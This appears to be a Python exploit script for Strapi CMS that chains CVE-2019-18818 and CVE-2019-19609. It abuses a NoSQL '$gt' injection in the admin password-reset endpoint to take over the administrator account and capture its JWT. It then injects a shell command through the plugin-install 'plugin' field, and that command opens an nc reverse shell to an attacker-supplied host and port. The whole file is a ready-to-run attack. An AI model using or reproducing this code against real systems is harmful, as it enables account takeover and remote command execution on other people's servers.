#!/usr/bin/env python3

# Github repository: https://github.com/Hackhoven/Strapi-RCE
# CVE-2019-18818 and CVE-2019-19609

import requests
import json
import sys

import requests
import json
import sys

if len(sys.argv) != 4:
    print("[-] Incorrect number of arguments provided.")
    print("[*] Usage: python3 strapi-rce.py <TARGET_URL> <LHOST> <LPORT>\n")
    sys.exit()

# Parse arguments
target_url = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

def check_strapi_version():
    print("[+] Checking Strapi CMS version")
    try:
        response = requests.get(f"{target_url}/admin/init").json()
        strapi_version = response["data"]["strapiVersion"]
        print(f"[+] Strapi CMS Version: {strapi_version}")	# that should be 3.0.0-beta.17.4
    except Exception as e:
        print(f"[-] Failed to check Strapi version: {e}")
        sys.exit(1)

def reset_password():
    global jwt_token
    print("[+] Exploiting reset password vulnerability")
    reset_payload = {
        "code": {"$gt": 0}, 		# MomgoDB command, gives resetToken values greater than (gt) 0 
        "password": "HackhovenHackhoven1",
        "passwordConfirmation": "HackhovenHackhoven1"
    }
    try:
        response = requests.post(f"{target_url}/admin/auth/reset-password", json=reset_payload).json()
        jwt_token = response["jwt"]
        username = response["user"]["username"]
        email = response["user"]["email"]
        print(f"[+] Password reset successful for user {username} ({email})")
        print(f"[+] JWT Token: {jwt_token}")
    except Exception as e:
        print(f"[-] Password reset failed: {e}")
        sys.exit(1)

def execute_reverse_shell():
    print("[+] Sending reverse shell payload")
    headers = {"Authorization": f"Bearer {jwt_token}"}
    shell_payload = {
        "plugin": f"documentation && $(rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/f)",
        "port": "1337"
    }
    try:
        response = requests.post(f"{target_url}/admin/plugins/install", json=shell_payload, headers=headers)
        print("[+] Payload sent, check your listener for a shell")
    except Exception as e:
        print(f"[-] Failed to send payload: {e}")

if __name__ == "__main__":
    if target_url.endswith("/"):
        target_url = target_url.rstrip('/')
    check_strapi_version()
    reset_password()
    execute_reverse_shell()
